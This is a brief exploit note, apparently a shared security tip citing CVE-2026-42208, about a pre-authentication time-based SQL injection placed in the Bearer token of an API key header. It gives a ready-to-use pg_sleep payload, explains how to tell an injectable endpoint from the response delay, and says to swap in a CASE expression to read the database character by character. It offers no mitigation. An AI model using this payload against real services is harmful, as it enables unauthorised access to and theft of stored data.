# SQLi on API Key

Authorization: Bearer x' OR (SELECT pg_sleep(3)) IS NOT NULL-- -

Inject into the Bearer, pre-auth. Don't ever prefix with "sk-".

Dead key, instant 401. SQLi hangs 3s, then 401. 

Swap the sleep for a CASE and read everything char by char.

[CVE-2026-42208](https://x.com/Zerodaylabowner/status/2123469268264026528?s=19)
